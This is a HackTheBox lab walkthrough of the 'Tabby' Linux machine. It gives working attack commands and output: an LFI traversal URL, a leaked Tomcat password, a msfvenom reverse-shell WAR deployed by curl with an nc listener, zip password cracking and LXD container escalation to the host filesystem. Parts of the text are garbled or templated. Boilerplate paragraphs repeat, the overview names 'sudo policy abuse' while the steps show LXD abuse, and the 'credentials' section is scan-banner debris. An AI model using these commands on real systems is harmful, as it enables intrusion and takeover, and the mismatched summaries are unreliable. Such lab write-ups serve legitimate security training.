---
title: "HackTheBox - Tabby (Linux)"
date: 2026-02-27
description: "HackTheBox Tabby Linux writeup マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [php, privilege-escalation, rce]
mermaid: true
content_lang: ja
alt_en: /posts/htb-tabby/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 22/tcp (ssh), 80/tcp (tcpwrapped), 8080/tcp (http) |
| 主な侵入経路 | Local file inclusion and configuration disclosure |
| 権限昇格経路 | Credentialed access -> sudo policy abuse -> elevated shell |

## 偵察

-
- rustscan
- nmap
- tomcat
- LFI
- lxc
-
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[15:02][CPU:10][MEM:58][TUN0:10.10.14.140][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.78.134:22
Open 10.129.78.134:80
Open 10.129.78.134:8080
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:02 JST
Initiating Ping Scan at 15:02
Scanning 10.129.78.134 [4 ports]
Completed Ping Scan at 15:02, 3.03s elapsed (1 total hosts)
Nmap scan report for 10.129.78.134 [host down, received no-response]
Read data files from: /usr/share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds
           Raw packets sent: 8 (304B) | Rcvd: 215 (8.600KB)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[15:02][CPU:12][MEM:58][TUN0:10.10.14.140][/home/n0z0]
🐉 > grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:02 JST
Warning: 10.129.78.134 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.78.134
Host is up (0.26s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp    open     tcpwrapped
1364/tcp  filtered ndm-server
8080/tcp  open     http       Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
22198/tcp filtered unknown
37195/tcp filtered unknown
41625/tcp filtered unknown
58062/tcp filtered unknown
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   247.24 ms 10.10.14.1
2   247.35 ms 10.129.78.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 800.11 seconds

```

💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

`
`http://10.129.78.134/news.php?file=../../../../../etc/passwd`
This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

![Screenshot showing exploitation evidence on tabby (step 1)](/assets/img/htb/tabby/Pasted%20image%2020251025180215.png)
*Caption: Screenshot captured during tabby at stage 1 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
medusa -h $ip -u ash -P /usr/share/wordlists/rockyou.txt -M ssh
ssh ash@$ip
```

```bash
✅[18:18][CPU:2][MEM:56][TUN0:10.10.14.140][/home/n0z0]
🐉 > medusa -h $ip -u ash -P /usr/share/wordlists/rockyou.txt -M ssh
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ERROR: No supported authentication methods located.
2025-10-25 18:39:35 ACCOUNT CHECK: [ssh] Host: 10.129.78.134 (1 of 1, 0 complete) User: ash (1 of 1, 0 complete) Password: 123456 (1 of 14344391 complete)

✅[18:39][CPU:2][MEM:58][TUN0:10.10.14.140][/home/n0z0]
🐉 > ssh ash@$ip                                                            
The authenticity of host '10.129.78.134 (10.129.78.134)' can't be established.
ED25519 key fingerprint is SHA256:mUt3fTn2/uoySPc6XapKq69a2/3EPRdW0T79hZ2davk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes\
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.78.134' (ED25519) to the list of known hosts.
ash@10.129.78.134: Permission denied (publickey).

```

![Screenshot showing exploitation evidence on tabby (step 2)](/assets/img/htb/tabby/Pasted%20image%2020251025190343.png)
*Caption: Screenshot captured during tabby at stage 2 of the attack chain.*

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.140 lport=4444 -f war -o pwn.war
```

```bash
✅[19:11][CPU:2][MEM:59][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > msfvenom -p java/shell_reverse_tcp lhost=10.10.14.140 lport=4444 -f war -o pwn.war
Payload size: 13027 bytes
Final size of war file: 13027 bytes
Saved as: pwn.war
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
✅[19:13][CPU:1][MEM:59][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > curl -v -u 'tomcat:$3cureP4s5w0rd123!' --upload-file pwn.war "http://10.129.78.134:8080/manager/text/deploy?path=/hack&update=true"
*   Trying 10.129.78.134:8080...
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[19:07][CPU:15][MEM:58][TUN0:10.10.14.140][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.140] from (UNKNOWN) [10.129.78.134] 49312
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 11070 May 19  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2756 Feb 13  2020 /usr/share/man/man8/vgcfgbackup.8.gz

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
wget http://10.129.78.134:8001/16162020_backup.zip
zip2john 16162020_backup.zip > sec.txt
john --wordlist=/usr/share/wordlists/rockyou.txt sec.txt
```

```bash
✅[19:54][CPU:6][MEM:57][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > wget http://10.129.78.134:8001/16162020_backup.zip   
--2025-10-25 19:54:50--  http://10.129.78.134:8001/16162020_backup.zip
10.129.78.134:8001 に接続しています... 接続しました。
HTTP による接続要求を送信しました、応答を待っています... 200 OK
長さ: 8716 (8.5K) [application/zip]
`16162020_backup.zip' に保存中

16162020_backup.zip                       100%[====================================================================================>]   8.51K  --.-KB/s 時間 0s       

2025-10-25 19:54:51 (362 MB/s) - `16162020_backup.zip' へ保存完了 [8716/8716]

✅[19:54][CPU:2][MEM:58][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > zip2john 16162020_backup.zip > sec.txt   

✅[19:55][CPU:1][MEM:58][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > john --wordlist=/usr/share/wordlists/rockyou.txt sec.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:00 DONE (2025-10-25 19:55) 2.000g/s 20742Kp/s 20742Kc/s 20742KC/s adornadis..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
tomcat@tabby:/var/www/html/files$ su - ash
su - ash
Password: admin@it
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
cat user.txt
```

```bash
ash@tabby:~$ cat user.txt
cat user.txt
90dec6fa426eaed5125ac2b6979de7ba

```

![Screenshot showing exploitation evidence on tabby (step 3)](/assets/img/htb/tabby/Pasted%20image%2020251025200057.png)
*Caption: Screenshot captured during tabby at stage 3 of the attack chain.*

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:~$ 
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
ls -la
python3 -m http.server 8001
```

```bash
✅[19:55][CPU:0][MEM:58][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 57, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 57 (delta 6), reused 8 (delta 4), pack-reused 42 (from 1)
Receiving objects: 100% (57/57), 3.12 MiB | 3.88 MiB/s, done.
Resolving deltas: 100% (19/19), done.

✅[22:00][CPU:10][MEM:61][TUN0:10.10.14.140][/home/n0z0/work/htb/Tabby]
🐉 > cd lxd-alpine-builder

✅[22:00][CPU:5][MEM:61][TUN0:10.10.14.140][.../Tabby/lxd-alpine-builder]
🐉 > sudo ./build-alpine 

❌[22:02][CPU:6][MEM:60][TUN0:10.10.14.140][.../Tabby/lxd-alpine-builder]
🐉 > ls -la
合計 7188
drwxrwxr-x 3 n0z0 n0z0    4096 10月 25 22:00 .
drwxrwxr-x 3 n0z0 n0z0    4096 10月 25 22:00 ..
drwxrwxr-x 7 n0z0 n0z0    4096 10月 25 22:00 .git
-rw-rw-r-- 1 n0z0 n0z0   26530 10月 25 22:00 LICENSE
-rw-rw-r-- 1 n0z0 n0z0     768 10月 25 22:00 README.md
-rw-rw-r-- 1 n0z0 n0z0 3259593 10月 25 22:00 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rw-r--r-- 1 root root 4043357 10月 25 22:00 alpine-v3.22-x86_64-20251025_2200.tar.gz
-rwxrwxr-x 1 n0z0 n0z0    8064 10月 25 22:00 build-alpine

✅[22:02][CPU:2][MEM:60][TUN0:10.10.14.140][.../Tabby/lxd-alpine-builder]
🐉 > python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.129.78.134 - - [25/Oct/2025 22:02:49] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
10.129.78.134 - - [25/Oct/2025 22:05:37] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image list
lxd init
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

```bash
ash@tabby:~$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
ash@tabby:~$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MB | Oct 25, 2025 at 1:06pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
ash@tabby:~$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
^JDo you want to configure a new storage pool? (yes/no) [default=yes]: 
^JName of the new storage pool [default=default]: 
^JName of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]: 
^JCreate a new ZFS pool? (yes/no) [default=yes]: 
^JWould you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
^JSize in GB of the new loop device (1GB minimum) [default=5GB]: 
^JWould you like to connect to a MAAS server? (yes/no) [default=no]: 
^JWould you like to create a new local network bridge? (yes/no) [default=yes]: 
^JWhat should the new bridge be called? [default=lxdbr0]: 
^JWhat IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
^JWhat IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
^JWould you like the LXD server to be available over the network? (yes/no) [default=no]: 
^JWould you like stale cached images to be updated automatically? (yes/no) [default=yes] 
^JWould you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
^Jash@tabby:~$ 

ash@tabby:~$ lxc init myimage privesc -c security.privileged=true
lxc init myimage privesc -c security.privileged=true
Creating privesc
ash@tabby:~$ lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to privesc
ash@tabby:~$ lxc start privesc
lxc start privesc
ash@tabby:~$ lxc exec privesc /bin/sh
lxc exec privesc /bin/sh

```

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `Tool / Command`
- `home/n0z0]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `HOME/work/scans/$(date`
- `22/tcp`
- `80/tcp`
- `1364/tcp`
- `8080/tcp`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

### Supplemental Notes

|---|---|
## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
